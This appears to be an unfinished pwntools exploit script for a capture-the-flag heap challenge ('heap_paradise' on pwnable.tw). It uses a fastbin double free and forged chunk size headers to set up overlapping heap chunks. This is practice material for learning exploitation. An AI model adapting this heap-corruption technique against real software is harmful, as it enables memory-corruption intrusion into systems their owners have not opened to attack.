from pwn import *

BEDUG = True

if BEDUG == True:
    io = process('./heap_paradise')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote('chall.pwnable.tw', 10308)
    libc = ELF('./libc_64.so.6')

def add(size, content):
    print(io.recvuntil(b'You Choice:'))
    io.sendline(b'1')
    print(io.recvuntil(b'Size :'))
    io.sendline(str(size).encode('utf-8'))
    print(io.recvuntil(b'Data :'))
    io.send(content)

def free(index):
    print(io.recvuntil(b'You Choice:'))
    io.sendline(b'2')
    print(io.recvuntil(b'Index :'))
    io.sendline(str(index).encode('utf-8'))

add(0x68, b'A') #0
add(0x68, b'A') #1
add(0x28, b'A') #2
add(0x18, b'A') #3
free(2)
free(0)
free(1)
free(0)
add(0x68, b'\x60') #4
add(0x68, b'A') #5
add(0x68, b'\0'*0x58+p64(0x7f)) #6
add(0x68, p64(0x70)+p64(0xa1)) #7
free(1)
add(0x78, b'A')
pause()
add(0x28, b'A')